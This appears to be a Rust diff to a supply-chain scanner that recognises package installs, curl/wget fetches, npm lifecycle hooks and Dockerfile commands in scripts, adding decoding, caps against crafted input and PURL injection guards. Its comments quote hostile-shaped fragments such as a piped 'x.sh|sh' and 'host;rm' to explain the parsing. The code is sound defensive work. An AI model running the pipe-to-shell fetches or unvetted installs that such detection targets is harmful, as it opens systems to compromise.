@@ -11,16 +11,20 @@
 //! Recognition is fuzzy by nature, so it lives here — away from filefacts'
 //! deterministic format parsers and from the auditable fetch boundary.
 
+use std::collections::HashMap;
+
 use filefacts::{Arg, FileType, ParsedFile, RefKind, RefLocator, Reference, Symbol};
+
+#[path = "find_js_commands.rs"]
+mod js_commands;
 
 /// All external references a file points at: filefacts' declared dependencies,
 /// plus the imperative ones recognized here.
 #[must_use]
 pub fn references(parsed: &ParsedFile<'_>) -> Vec<Reference> {
-    let mut found = Found::new(
-        parsed.references().to_vec(),
-        std::str::from_utf8(parsed.bytes()).ok(),
-    );
+    let file_type = parsed.fileid().file_type();
+    let text = scan_text(parsed.bytes(), file_type);
+    let mut found = Found::new(parsed.references().to_vec(), text.as_deref());
     // Value-driven recognition (npm lifecycle hooks) works from facts alone, so
     // it runs for every file — it no-ops when there is no `npm.scripts` branch.
     npm_scripts(parsed.values().as_json(), &mut found);
@@ -29,11 +33,12 @@ pub fn references(parsed: &ParsedFile<'_>) -> Vec<Reference> {
     // or url-encoded URL the raw bytes never show in the clear).
     extracted_refs(parsed, &mut found);
     // Text-driven recognition needs the raw bytes.
-    match parsed.fileid().file_type() {
+    match file_type {
         FileType::Shell => scan_shell(found.text, "shell", &mut found),
         FileType::Dockerfile => scan_shell(found.text, "dockerfile", &mut found),
         FileType::JavaScript | FileType::TypeScript => {
             scan_source(parsed, "javascript", &mut found);
+            js_commands::scan(parsed, &mut found);
         }
         FileType::Python => scan_source(parsed, "python", &mut found),
         FileType::PowerShell => scan_powershell(found.text, "powershell", &mut found),
@@ -41,6 +46,78 @@ pub fn references(parsed: &ParsedFile<'_>) -> Vec<Reference> {
     }
     dedup(&mut found.refs);
     found.refs
+}
+
+/// The file's text for the text-driven recognizers. A script with one invalid
+/// UTF-8 byte still runs, so it must not switch its own scanning off: for the
+/// file types scanned as text, each invalid byte becomes one space, keeping
+/// every offset an offset into the original bytes.
+///
+/// A UTF-16 script (Windows tools save PowerShell that way) is decoded first,
+/// or it would never be scanned at all. Its references' offsets are then
+/// positions in the decoded text, so only approximate in the file.
+fn scan_text(bytes: &[u8], file_type: FileType) -> Option<std::borrow::Cow<'_, str>> {
+    if matches!(
+        file_type,
+        FileType::Shell | FileType::Dockerfile | FileType::PowerShell
+    ) && let Some(text) = utf16_text(bytes, file_type == FileType::PowerShell)
+    {
+        return Some(text.into());
+    }
+    match std::str::from_utf8(bytes) {
+        Ok(text) => Some(text.into()),
+        Err(_)
+            if matches!(
+                file_type,
+                FileType::Shell
+                    | FileType::Dockerfile
+                    | FileType::PowerShell
+                    | FileType::JavaScript
+                    | FileType::TypeScript
+                    | FileType::Python
+            ) =>
+        {
+            let mut text = String::with_capacity(bytes.len());
+            for chunk in bytes.utf8_chunks() {
+                text.push_str(chunk.valid());
+                text.extend(std::iter::repeat_n(' ', chunk.invalid().len()));
+            }
+            Some(text.into())
+        }
+        Err(_) => None,
+    }
+}
+
+/// `bytes` decoded as UTF-16, when they start with its byte-order mark — or,
+/// with `sniff`, look like BOM-less UTF-16LE text (every odd byte of the
+/// opening run zero, as ASCII text encodes). Unpaired surrogates become
+/// U+FFFD.
+fn utf16_text(bytes: &[u8], sniff: bool) -> Option<String> {
+    let (body, little) = match bytes {
+        [0xFF, 0xFE, rest @ ..] => (rest, true),
+        [0xFE, 0xFF, rest @ ..] => (rest, false),
+        [first, ..]
+            if sniff
+                && bytes.len() >= 4
+                && *first != 0
+                && bytes.iter().take(256).skip(1).step_by(2).all(|&b| b == 0) =>
+        {
+            (bytes, true)
+        }
+        _ => return None,
+    };
+    let units = body.as_chunks::<2>().0.iter().map(|&pair| {
+        if little {
+            u16::from_le_bytes(pair)
+        } else {
+            u16::from_be_bytes(pair)
+        }
+    });
+    Some(
+        char::decode_utf16(units)
+            .map(|c| c.unwrap_or(char::REPLACEMENT_CHARACTER))
+            .collect(),
+    )
 }
 
 /// References discoverable from a file's *facts* alone — its declared
@@ -70,10 +147,10 @@ fn extracted_refs(parsed: &ParsedFile<'_>, out: &mut Found<'_>) {
         // `data_offset` points at the encoded run it came from.
         for url in extract_urls(&s.value) {
             out.push_at(
-                RefLocator::Url(url.to_string()),
+                url_locator(url),
                 RefKind::UrlFetch,
                 "string",
-                s.value.clone(),
+                &s.value,
                 Some(s.data_offset),
             );
         }
@@ -251,6 +328,21 @@ fn position_in(text: &str, part: &str) -> Option<usize> {
 /// number of references from costing time quadratic in its size.
 const EVIDENCE_SEARCHES: usize = 64;
 
+/// The most evidence one reference keeps. Evidence is often a whole line, and
+/// a crafted line can name a package per token: copying it for each would
+/// cost memory quadratic in the line's length.
+const MAX_EVIDENCE_BYTES: usize = 1024;
+
+/// The most references the recognizers here add for one file. Past this, a
+/// file is padding rather than a program; the cap is logged so the
+/// truncation is never silent.
+const MAX_FOUND_REFS: usize = 50_000;
+
+/// `evidence` cut to [`MAX_EVIDENCE_BYTES`] on a character boundary.
+fn clip(evidence: &str) -> &str {
+    &evidence[..evidence.floor_char_boundary(MAX_EVIDENCE_BYTES)]
+}
+
 /// Accumulator that carries the file text so each pushed reference gets a
 /// citable byte offset.
 struct Found<'a> {
@@ -261,6 +353,8 @@ struct Found<'a> {
     /// The last evidence searched for and where it was found, so the
     /// packages of one command line share one search.
     last_search: Option<(String, Option<u64>)>,
+    /// References still allowed (see [`MAX_FOUND_REFS`]).
+    room: usize,
 }
 
 impl<'a> Found<'a> {
@@ -270,6 +364,7 @@ impl<'a> Found<'a> {
             text,
             searches: EVIDENCE_SEARCHES,
             last_search: None,
+            room: MAX_FOUND_REFS,
         }
     }
 
@@ -285,11 +380,20 @@ impl<'a> Found<'a> {
         source: impl Into<String>,
         evidence: &str,
     ) {
-        let offset = match self.text.and_then(|t| position_in(t, evidence)) {
+        if self.room == 0 {
+            return;
+        }
+        let offset = self.locate(evidence, &locator);
+        self.push_at(locator, kind, source, evidence, offset);
+    }
+
+    /// Where `evidence` sits: its place when it was cut from the file's own
+    /// text, else where a search finds it (see [`search`](Self::search)).
+    fn locate(&mut self, evidence: &str, locator: &RefLocator) -> Option<u64> {
+        match self.text.and_then(|t| position_in(t, evidence)) {
             Some(at) => Some(at as u64),
-            None => self.search(evidence, &locator),
-        };
-        self.push_at(locator, kind, source, evidence.to_string(), offset);
+            None => self.search(evidence, locator),
+        }
     }
 
     /// Where `evidence` (else `locator`'s anchor) first occurs in the text,
@@ -316,10 +420,20 @@ impl<'a> Found<'a> {
         locator: RefLocator,
         kind: RefKind,
         source: impl Into<String>,
-        evidence: String,
+        evidence: &str,
         offset: Option<u64>,
     ) {
-        let mut r = Reference::new(locator, kind, source, evidence);
+        if self.room == 0 {
+            return;
+        }
+        self.room -= 1;
+        if self.room == 0 {
+            tracing::warn!(
+                limit = MAX_FOUND_REFS,
+                "reference limit reached; later references in this file are dropped"
+            );
+        }
+        let mut r = Reference::new(locator, kind, source, clip(evidence).to_owned());
         r.offset = offset;
         self.refs.push(r);
     }
@@ -340,12 +454,7 @@ fn npm_scripts(values: &serde_json::Value, out: &mut Found<'_>) {
         };
         let source = format!("npm.scripts.{hook}");
         for url in extract_urls(cmd) {
-            out.push(
-                RefLocator::Url(url.to_string()),
-                RefKind::UrlFetch,
-                source.clone(),
-                cmd,
-            );
+            out.push(url_locator(url), RefKind::UrlFetch, source.clone(), cmd);
         }
         let start = out.refs.len();
         commands(cmd, None, &source, out);
@@ -360,6 +469,16 @@ fn npm_scripts(values: &serde_json::Value, out: &mut Found<'_>) {
     }
 }
 
+/// AST nodes one walk may visit. The walk visits the file's end first, so a
+/// budget small enough for padding to exhaust would hide the calls and
+/// imports above it.
+const AST_NODE_BUDGET: usize = 8_000_000;
+
+/// The longest callee text worth reading as a dotted name. A longer one is an
+/// inline function or similar, never a recognized API, and compacting nested
+/// ones would cost time quadratic in the nesting.
+const MAX_CALLEE_BYTES: usize = 256;
+
 /// Hunt commands only inside actual process or package installation calls.
 /// A comment, documentation string, or unrelated string is never a call node.
 fn scan_source(parsed: &ParsedFile<'_>, source: &str, out: &mut Found<'_>) {
@@ -372,8 +491,9 @@ fn scan_source(parsed: &ParsedFile<'_>, source: &str, out: &mut Found<'_>) {
     };
     let text = ast.source;
     let bindings = js_import_bindings(parsed);
+    let imports = import_aliases(parsed.symbols().as_slice());
     let mut stack = vec![ast.tree.root_node()];
-    let mut remaining = 100_000usize;
+    let mut remaining = AST_NODE_BUDGET;
     let mut calls = Vec::new();
     let mut comments = Vec::new();
     while let Some(node) = stack.pop() {
@@ -388,9 +508,9 @@ fn scan_source(parsed: &ParsedFile<'_>, source: &str, out: &mut Found<'_>) {
             && let Some(function) = node.child_by_field_name("function")
             && let Some(arguments) = node.child_by_field_name("arguments")
             && let Some(callee) = text.get(function.byte_range())
+            && callee.len() <= MAX_CALLEE_BYTES
         {
             let compact: String = callee.chars().filter(|c| !c.is_whitespace()).collect();
-            let original = compact.clone();
             let (head, tail) = compact.split_once('.').unwrap_or((&compact, ""));
             let compact = if let Some(binding) = bindings.get(head) {
                 if tail.is_empty() {
@@ -399,7 +519,7 @@ fn scan_source(parsed: &ParsedFile<'_>, source: &str, out: &mut Found<'_>) {
                     format!("{binding}.{tail}")
                 }
             } else {
-                resolve_import_alias(&compact, parsed.symbols().as_slice())
+                resolve_import_alias(&compact, &imports)
             };
             let eco = match (source, compact.as_str()) {
                 ("javascript" | "typescript", "import" | "require") => Some("npm"),
@@ -422,7 +542,7 @@ fn scan_source(parsed: &ParsedFile<'_>, source: &str, out: &mut Found<'_>) {
                     locator,
                     kind,
                     "ast-call",
-                    spec.to_owned(),
+                    spec,
                     Some(node.start_byte() as u64),
                 );
             }
@@ -461,7 +581,10 @@ fn scan_source(parsed: &ParsedFile<'_>, source: &str, out: &mut Found<'_>) {
                 if end > arguments.start_byte()
                     && let Some(span) = text.get(node.start_byte()..end)
                 {
-                    let prefix = (installer && !installation_call(source, &original))
+                    // An installer's callee is the command (`pip.main` →
+                    // `pip main`), taken from its resolved name: the source
+                    // text may be an alias, and is code, not command text.
+                    let prefix = installer
                         .then(|| (compact.clone(), arguments.start_byte() - node.start_byte()));
                     calls.push((span, node.start_byte(), prefix));
                 }
@@ -521,14 +644,14 @@ fn literal_specifier(raw: &str) -> Option<&str> {
 /// JavaScript import and require bindings aren't member-level import symbols
 /// in filefacts. Recover only literal bindings from syntax, never source text
 /// that merely resembles an import inside a comment or string.
-fn js_import_bindings(parsed: &ParsedFile<'_>) -> std::collections::HashMap<String, String> {
-    let mut bindings = std::collections::HashMap::new();
+fn js_import_bindings(parsed: &ParsedFile<'_>) -> HashMap<String, String> {
+    let mut bindings = HashMap::new();
     let Some(ast) = parsed.source_ast() else {
         return bindings;
     };
     let text = ast.source;
     let mut stack = vec![ast.tree.root_node()];
-    let mut remaining = 100_000usize;
+    let mut remaining = AST_NODE_BUDGET;
     while let Some(node) = stack.pop() {
         if remaining == 0 {
             break;
@@ -605,8 +728,20 @@ fn js_import_bindings(parsed: &ParsedFile<'_>) -> std::collections::HashMap<Stri
     bindings
 }
 
-fn resolve_import_alias(callee: &str, symbols: &[Symbol]) -> String {
+fn resolve_import_alias(callee: &str, imports: &HashMap<&str, String>) -> String {
     let (head, tail) = callee.split_once('.').unwrap_or((callee, ""));
+    match imports.get(head) {
+        Some(canonical) if tail.is_empty() => canonical.clone(),
+        Some(canonical) => format!("{canonical}.{tail}"),
+        None => callee.to_owned(),
+    }
+}
+
+/// Each imported local name and the canonical name it stands for, the first
+/// import of a name winning. Built once per file, so resolving a call costs a
+/// lookup rather than a pass over every symbol.
+fn import_aliases(symbols: &[Symbol]) -> HashMap<&str, String> {
+    let mut imports = HashMap::new();
     for symbol in symbols {
         if let Symbol::Import {
             name,
@@ -614,21 +749,16 @@ fn resolve_import_alias(callee: &str, symbols: &[Symbol]) -> String {
             library,
             ..
         } = symbol
-            && alias.as_deref().unwrap_or(name) == head
         {
-            let canonical = if let Some(library) = library {
-                format!("{library}.{name}")
-            } else {
-                name.clone()
-            };
-            return if tail.is_empty() {
-                canonical
-            } else {
-                format!("{canonical}.{tail}")
-            };
+            imports
+                .entry(alias.as_deref().unwrap_or(name))
+                .or_insert_with(|| match library {
+                    Some(library) => format!("{library}.{name}"),
+                    None => name.clone(),
+                });
         }
     }
-    callee.to_owned()
+    imports
 }
 
 fn execution_call(source: &str, callee: &str) -> bool {
@@ -696,12 +826,24 @@ fn installation_call(source: &str, callee: &str) -> bool {
 }
 
 /// Normalize a single call span and retain its exact byte-to-source mapping.
+///
+/// Only string literals are command text. An unquoted word is code — a
+/// variable, a keyword argument, the callee — and is marked as a variable
+/// (`$name`), which no package token accepts: `["pip", "install", pip_name]`
+/// installs whatever `pip_name` holds, not a package called `pip_name`.
 fn normalize_call(text: &str, base: usize) -> (String, Vec<(usize, usize)>) {
     let mut normalized = String::with_capacity(text.len());
     let mut remap = vec![(0, base)];
     let mut quote = None;
     let mut escaped = false;
+    let mut in_word = false;
     for (at, c) in text.char_indices() {
+        let word = quote.is_none() && (c.is_alphanumeric() || matches!(c, '_' | '$'));
+        if word && !in_word && (c.is_alphabetic() || c == '_') {
+            normalized.push('$');
+            remap.push((normalized.len(), base + at));
+        }
+        in_word = word;
         if let Some(delimiter) = quote {
             if escaped {
                 normalized.push(c);
@@ -826,6 +968,17 @@ fn decode_escapes(spec: &str) -> Option<String> {
     let mut out = String::with_capacity(spec.len());
     let mut i = 0;
     while i < src.len() {
+        // A backslash before a line terminator continues the line: both
+        // languages drop the pair, so it must not split a command in two.
+        let continuation = match src.get(i..i + 2) {
+            Some(['\\', '\r']) if src.get(i + 2) == Some(&'\n') => 3,
+            Some(['\\', '\n' | '\r' | '\u{2028}' | '\u{2029}']) => 2,
+            _ => 0,
+        };
+        if continuation > 0 {
+            i += continuation;
+            continue;
+        }
         match escape_at(&src[i..]) {
             Some((c, consumed)) => {
                 out.push(c);
@@ -1066,9 +1219,32 @@ fn scan_shell(text: Option<&str>, source: &str, out: &mut Found<'_>) {
         return;
     };
     commands(text, Some(&[]), source, out);
+    if source == "dockerfile" {
+        for command in exec_forms(text) {
+            commands(&command, None, source, out);
+        }
+    }
     git_refs(text, source, out);
     urls(text, source, out);
     bare_fetch_urls(text, source, &[CURL, WGET], out);
+}
+
+/// The commands a Dockerfile spells in exec form — `RUN ["npm","install","x"]`,
+/// `CMD ["/bin/sh","-c","npm i x"]` — as the words they run, joined with
+/// spaces. The JSON array is one shell-less token to [`commands`], which would
+/// otherwise see none of its words.
+fn exec_forms(text: &str) -> impl Iterator<Item = String> + '_ {
+    text.lines().filter_map(|line| {
+        let (instruction, rest) = line.trim().split_once(char::is_whitespace)?;
+        if !["RUN", "CMD", "ENTRYPOINT"]
+            .iter()
+            .any(|i| instruction.eq_ignore_ascii_case(i))
+        {
+            return None;
+        }
+        let words: Vec<String> = serde_json::from_str(rest.trim()).ok()?;
+        Some(words.join(" "))
+    })
 }
 
 /// Scan PowerShell web-cmdlet arguments for fetchable URLs. PowerShell's
@@ -1093,16 +1269,28 @@ fn scan_powershell(text: Option<&str>, source: &str, out: &mut Found<'_>) {
 fn bare_fetch_urls(text: &str, source: &str, tools: &[FetchTool], out: &mut Found<'_>) {
     for line in text.lines() {
         let tokens: Vec<&str> = line.split_whitespace().collect();
-        for (index, token) in tokens.iter().enumerate() {
-            let command = token.trim_matches(|c| matches!(c, '\'' | '"' | '`' | '('));
-            let Some(tool) = tools.iter().find(|tool| {
-                tool.names
-                    .iter()
-                    .any(|name| command.eq_ignore_ascii_case(name))
-            }) else {
-                continue;
-            };
-            if let Some(target) = tool.bare_target(&tokens[index + 1..]) {
+        let invocations: Vec<(usize, &FetchTool)> = tokens
+            .iter()
+            .enumerate()
+            .filter_map(|(index, token)| {
+                let command =
+                    tool_name(token.trim_matches(|c| matches!(c, '\'' | '"' | '`' | '(')));
+                let tool = tools.iter().find(|tool| {
+                    tool.names
+                        .iter()
+                        .any(|name| command.eq_ignore_ascii_case(name))
+                })?;
+                Some((index, tool))
+            })
+            .collect();
+        // Each invocation's arguments end where the next one begins, so a
+        // line of nothing but tool names costs linear time, not quadratic.
+        // A target past the next invocation is that invocation's to find.
+        for (n, &(index, tool)) in invocations.iter().enumerate() {
+            let end = invocations
+                .get(n + 1)
+                .map_or(tokens.len(), |&(next, _)| next);
+            if let Some(target) = tool.bare_target(&tokens[index + 1..end]) {
                 out.push(
                     RefLocator::Url(format!("https://{target}")),
                     RefKind::UrlFetch,
@@ -1287,16 +1475,21 @@ impl FetchTool {
             {
                 return None;
             }
+            // An operator glued to a word (`x.sh|sh`, `host;rm`) ends the
+            // command there.
+            let (word, ends) = raw
+                .find(['|', ';', '&', '>', '<'])
+                .map_or((*raw, false), |at| (&raw[..at], true));
             let arg =
-                raw.trim_matches(|c| matches!(c, '\'' | '"' | '`' | ')' | ']' | '}' | ',' | ';'));
+                word.trim_matches(|c| matches!(c, '\'' | '"' | '`' | ')' | ']' | '}' | ',' | ';'));
             if arg.starts_with('-') {
-                if (self.takes_value)(arg) {
+                if !ends && (self.takes_value)(arg) {
                     args.next();
                 }
             } else if looks_like_protocolless_url(arg) {
                 return Some(arg);
             }
-            if raw.ends_with(';') {
+            if ends {
                 return None;
             }
         }
@@ -1349,19 +1542,33 @@ fn powershell_option_takes_value(opt: &str) -> bool {
     !"uri".starts_with(&name) && !SWITCHES.iter().any(|switch| switch.starts_with(&name))
 }
 
-/// A conservative host/path check used only after a recognized fetch command.
+/// A conservative host/path check used only after a recognized fetch command:
+/// a dotted host name or an IPv4 address, an optional numeric port, and an
+/// optional path.
 fn looks_like_protocolless_url(value: &str) -> bool {
     if value.is_empty()
-        || value.contains([':', '\\', '"', '\'', '`', '|', ';', '<', '>', '(', ')'])
+        || value.contains(['\\', '"', '\'', '`', '|', ';', '<', '>', '(', ')'])
         || value.contains("//")
     {
         return false;
     }
-    let (host, path) = value
+    let (authority, path) = value
         .split_once('/')
         .map_or((value, None), |(h, p)| (h, Some(p)));
-    if host.is_empty() || path.is_some_and(str::is_empty) || !host.contains('.') {
+    let (host, port) = authority
+        .split_once(':')
+        .map_or((authority, None), |(h, p)| (h, Some(p)));
+    if host.is_empty()
+        || path.is_some_and(|path| path.is_empty() || path.contains(':'))
+        || port.is_some_and(|port| {
+            !port.bytes().all(|b| b.is_ascii_digit()) || !port.parse::<u16>().is_ok_and(|n| n > 0)
+        })
+        || !host.contains('.')
+    {
         return false;
+    }
+    if host.parse::<std::net::Ipv4Addr>().is_ok() {
+        return true;
     }
     let labels: Vec<&str> = host.split('.').collect();
     if labels.len() < 2
@@ -1413,7 +1620,18 @@ fn commands(scan: &str, remap: Option<&[(usize, usize)]>, source: &str, out: &mu
                 None => at,
             }
         });
-        let toks: Vec<&str> = seg.split_whitespace().collect();
+        // Quotes group a word without being part of it: `npm install "evil"`
+        // installs `evil`.
+        let toks: Vec<&str> = seg
+            .split_whitespace()
+            .map(|t| t.trim_matches(['"', '\'']))
+            .filter(|t| !t.is_empty())
+            .collect();
+        // A `for`/`select` header's words are a list of values, not a command:
+        // `for pm in apt-get dnf pkg_add port` installs nothing.
+        if toks.first().is_some_and(|t| matches!(*t, "for" | "select")) {
+            continue;
+        }
         if dockerfile && toks.first().is_some_and(|t| t.eq_ignore_ascii_case("FROM")) {
             // The image: the first token after `FROM` that is not a flag
             // (`--platform=`); a build-arg placeholder (`$BASE`) or `scratch`
@@ -1433,46 +1651,144 @@ fn commands(scan: &str, remap: Option<&[(usize, usize)]>, source: &str, out: &mu
         // Go: a foreign Go install counts only in a recognized
         // process-execution call, while shell scripts and Dockerfiles keep
         // their unrestricted command behavior.
-        let Some((family, args)) = (0..toks.len()).find_map(|i| {
+        let echo = toks
+            .iter()
+            .position(|token| matches!(*token, "echo" | "printf"));
+        let Some((family, args, runner)) = (0..toks.len()).find_map(|i| {
             let (family, consumed) = match_pm(&toks[i..])?;
             if !matches!(source, "javascript" | "typescript" | "python")
-                && toks[..i]
-                    .iter()
-                    .any(|token| matches!(*token, "echo" | "printf"))
+                && echo.is_some_and(|at| at < i)
             {
                 return None;
             }
-            Some((family, &toks[i + consumed..]))
+            // A one-shot runner (`npx`, `uvx`, `pnpm dlx`, `pipx run`) runs
+            // one package; what follows it is that package's arguments.
+            let runner = (matches!(family, "npm" | "pypi")
+                && (matches!(tool_name(toks[i]), "npx" | "bunx" | "uvx")
+                    || matches!(toks[i + consumed - 1], "dlx" | "x" | "run")))
+                || (family == "deno" && toks[i + consumed - 1] == "run");
+            Some((family, &toks[i + consumed..], runner))
         }) else {
             continue;
         };
         let eco = distro_eco(family, distro);
-        // A redirect, or an options-object `{`, ends the list.
-        let mut skip_value = false;
-        let packages = args
-            .iter()
-            .take_while(|arg| !arg.starts_with(['>', '<', '#']) && **arg != "{")
-            .filter(|arg| {
-                if skip_value {
-                    skip_value = false;
-                    return false;
-                }
-                skip_value = package_option_takes_value(eco, arg);
-                !skip_value
-            });
-        for locator in packages.filter_map(|arg| pm_token_locator(eco, arg)) {
-            match offset {
-                Some(offset) => out.push_at(
-                    locator,
-                    RefKind::Command,
-                    source,
-                    seg.to_string(),
-                    Some(offset as u64),
-                ),
-                None => out.push(locator, RefKind::Command, source, seg),
+        // A redirect (`>out`, `2>/dev/null`, `&>log`), an options-object `{`,
+        // or a nested command (`$(…)`, a backquote) ends the list, and a word
+        // closing the subshell the command ran in (`…/protoc-gen-go)`) is its
+        // last.
+        let mut list = Vec::new();
+        for &arg in args {
+            let redirect = arg
+                .trim_start_matches(|c: char| c.is_ascii_digit() || c == '&')
+                .starts_with(['>', '<']);
+            if redirect || arg.starts_with(['#', '`']) || arg.starts_with("$(") || arg == "{" {
+                break;
+            }
+            let closes = arg.ends_with(')') && !arg.contains('(');
+            let word = arg.trim_end_matches(')').trim_matches(['"', '\'']);
+            if !word.is_empty() {
+                list.push(word);
+            }
+            if closes {
+                break;
             }
         }
+        let args = list;
+        let packages = if runner {
+            runner_packages(eco, &args)
+        } else {
+            let mut skip_value = false;
+            args.into_iter()
+                .filter(|arg| {
+                    if skip_value {
+                        skip_value = false;
+                        return false;
+                    }
+                    skip_value = package_option_takes_value(eco, arg);
+                    !skip_value
+                })
+                .collect()
+        };
+        let mut locators = packages
+            .into_iter()
+            .filter_map(|arg| pm_token_locator(eco, arg));
+        let Some(first) = locators.next() else {
+            continue;
+        };
+        // One place for the whole segment, found once: every package of it
+        // shares the evidence, and comparing a long line per package is
+        // quadratic.
+        let at = match offset {
+            Some(offset) => Some(offset as u64),
+            None => out.locate(seg, &first),
+        };
+        for locator in std::iter::once(first).chain(locators) {
+            out.push_at(locator, RefKind::Command, source, seg, at);
+        }
     }
+}
+
+/// The packages a one-shot runner's arguments name: those its package option
+/// names (`npx -p a -p b cmd`, `uvx --from a cmd`, `uvx --with a b`), and the
+/// first positional unless a package option already named what it runs —
+/// then the positional is a command. Everything after it is its arguments.
+fn runner_packages<'t>(eco: &str, args: &[&'t str]) -> Vec<&'t str> {
+    // Options naming the package that runs, and ones adding packages beside it.
+    let (names, adds): (&[&str], &[&str]) = match eco {
+        "pypi" => (&["--from"], &["--with"]),
+        // `deno run` runs its first positional; only an `npm:`/`jsr:`
+        // specifier there is a package.
+        "deno" => (&[], &[]),
+        _ => (&["-p", "--package"], &[]),
+    };
+    let mut packages = Vec::new();
+    let mut named = false;
+    let mut args = args.iter().copied();
+    while let Some(arg) = args.next() {
+        let (option, attached) = arg
+            .split_once('=')
+            .map_or((arg, None), |(o, v)| (o, Some(v)));
+        if names.contains(&option) || adds.contains(&option) {
+            named |= names.contains(&option);
+            packages.extend(attached.or_else(|| args.next()));
+        } else if arg.starts_with('-') {
+            if package_option_takes_value(eco, arg) {
+                args.next();
+            }
+        } else {
+            if !named {
+                packages.push(arg);
+            }
+            break;
+        }
+    }
+    packages
+}
+
+/// A command word's program name: `/opt/venv/bin/pip` and
+/// `C:\Python312\Scripts\pip.exe` both run `pip`. A URL is not a path to a
+/// program.
+fn tool_name(token: &str) -> &str {
+    if token.contains("://") {
+        return token;
+    }
+    // A command opening a subshell or substitution: `$(go install x)`,
+    // `GEN=$(go install x)`, `(npm i y)`, a backquote.
+    let token = token
+        .rsplit_once("$(")
+        .map_or(token, |(_, command)| command)
+        .trim_start_matches(['(', '`']);
+    let name = token.rsplit(['/', '\\']).next().unwrap_or(token);
+    // Windows resolves `pip.exe`, `npm.cmd` and `npx.ps1` from a bare `pip`.
+    name.len()
+        .checked_sub(4)
+        .and_then(|stem| Some((name.get(..stem)?, name.get(stem..)?)))
+        .filter(|(_, ext)| {
+            [".exe", ".cmd", ".bat", ".ps1"]
+                .iter()
+                .any(|known| ext.eq_ignore_ascii_case(known))
+        })
+        .map_or(name, |(stem, _)| stem)
 }
 
 fn package_option_takes_value(ecosystem: &str, option: &str) -> bool {
@@ -1508,6 +1824,17 @@ fn package_option_takes_value(ecosystem: &str, option: &str) -> bool {
                 | "--python-version"
                 | "--implementation"
                 | "--abi"
+        ),
+        "deno" => matches!(
+            option,
+            "-c" | "--config"
+                | "--import-map"
+                | "--lock"
+                | "--cert"
+                | "--location"
+                | "--seed"
+                | "--env-file"
+                | "--watch-exclude"
         ),
         _ => false,
     }
@@ -1580,12 +1907,7 @@ fn distro_eco(family: &'static str, distro: Option<&str>) -> &'static str {
 fn urls(text: &str, source: &str, out: &mut Found<'_>) {
     for line in text.lines() {
         for url in extract_urls(line) {
-            out.push(
-                RefLocator::Url(url.to_string()),
-                RefKind::UrlFetch,
-                source,
-                line.trim(),
-            );
+            out.push(url_locator(url), RefKind::UrlFetch, source, line.trim());
         }
     }
 }
@@ -1607,7 +1929,7 @@ fn match_pm(toks: &[&str]) -> Option<(&'static str, usize)> {
         }
         verbs.contains(toks.get(i)?).then_some(i + 1)
     };
-    match *toks.first()? {
+    match tool_name(toks.first()?) {
         // One-shot remote runners fetch-and-run a package without declaring it
         // (`npx pkg`, `bunx pkg`, `uvx pkg`); the package follows immediately.
         "npx" | "bunx" => Some(("npm", 1)),
@@ -1744,7 +2066,39 @@ fn is_pacman_sync(t: &str) -> bool {
 /// A command argument as a package locator, or `None` if it is a flag, file,
 /// path, or URL rather than a named package.
 fn pm_token_locator(eco: &str, tok: &str) -> Option<RefLocator> {
-    if !looks_like_package(eco, tok) {
+    if eco == "npm"
+        && let Some(locator) = npm_github_locator(tok)
+    {
+        return Some(locator);
+    }
+    // A variable is a value this text does not hold. In the version
+    // (`kind@v$KIND_VERSION`, `pkg==$V`) it leaves a known name; anywhere in
+    // the name (`$PKG`, `mingw-${arch}-gcc`) there is no package to name.
+    let tok = match tok.find(['$', '`']) {
+        Some(at) => {
+            let head = &tok[..at];
+            let version_at = head.rfind(['@', '=']).filter(|&at| at > 0)?;
+            head[..version_at].trim_end_matches('=')
+        }
+        None => tok,
+    };
+    // Go's `/...` pattern names every package under a path; the path is the
+    // package to report (`golang.org/x/tools/cmd/...@latest`).
+    let pattern;
+    let tok = if eco == "golang" && tok.contains("/...") {
+        pattern = tok.replacen("/...", "", 1);
+        pattern.as_str()
+    } else {
+        tok
+    };
+    // Every builder below pastes the token into a PURL, where these would
+    // forge a qualifier (`download_url`, `checksum`), a subpath, or an
+    // escape: attacker bytes filed under a genuine package's name. Quotes,
+    // parentheses and braces are shell or code syntax a word kept, never
+    // part of a package name.
+    if tok.contains(['?', '#', '%', '&', '"', '\'', '(', ')', '{', '}'])
+        || !looks_like_package(eco, tok)
+    {
         return None;
     }
     let purl = match eco {
@@ -1773,6 +2127,36 @@ fn pm_token_locator(eco: &str, tok: &str) -> Option<RefLocator> {
         _ => return None,
     };
     Some(RefLocator::Purl(purl))
+}
+
+/// A GitHub source package passed to npm/npx is an executable package
+/// reference, not an npm name and not merely repository metadata.
+fn npm_github_locator(token: &str) -> Option<RefLocator> {
+    let spec = token
+        .strip_prefix("github:")
+        .or_else(|| token.strip_prefix("https://github.com/"))
+        .or_else(|| token.strip_prefix("git+https://github.com/"))?;
+    let (repo, revision) = spec
+        .split_once('#')
+        .map_or((spec, None), |(r, v)| (r, Some(v)));
+    let (owner, name) = repo.split_once('/')?;
+    let name = name.strip_suffix(".git").unwrap_or(name);
+    let safe = |s: &str| {
+        !s.is_empty()
+            && s.bytes()
+                .all(|c| c.is_ascii_alphanumeric() || b"._-".contains(&c))
+            && s != "."
+            && s != ".."
+    };
+    if !safe(owner) || !safe(name) {
+        return None;
+    }
+    // A revision that can't be spelled safely still names the repository.
+    let revision = revision.filter(|v| safe(v));
+    Some(RefLocator::Purl(match revision {
+        Some(revision) => format!("pkg:github/{owner}/{name}@{revision}"),
+        None => format!("pkg:github/{owner}/{name}"),
+    }))
 }
 
 /// `pkg:<eco>/<name>` for an OS-package token: strips an apt architecture
@@ -1863,12 +2247,22 @@ fn conda_purl_token(tok: &str) -> Option<String> {
 /// is a plain fetch surfaced by `urls`, not a registry package.
 fn deno_purl_token(tok: &str) -> Option<String> {
     if let Some(spec) = tok.strip_prefix("npm:") {
-        npm_purl_token(spec)
+        npm_purl_token(without_subpath(spec))
     } else if let Some(spec) = tok.strip_prefix("jsr:") {
-        jsr_purl_token(spec)
+        jsr_purl_token(without_subpath(spec))
     } else {
         None
     }
+}
+
+/// A Deno package specifier without its module subpath: `pkg@1/sub` → `pkg@1`,
+/// `@scope/pkg/sub` → `@scope/pkg`. The subpath names a file inside the
+/// package, not another package.
+fn without_subpath(spec: &str) -> &str {
+    let segments = if spec.starts_with('@') { 2 } else { 1 };
+    spec.match_indices('/')
+        .nth(segments - 1)
+        .map_or(spec, |(at, _)| &spec[..at])
 }
 
 /// `pkg:jsr/%40<scope>/<name>[@<version>]` from a JSR specifier, which is always
@@ -1950,10 +2344,69 @@ fn anchor_from_locator(loc: &RefLocator) -> String {
     }
 }
 
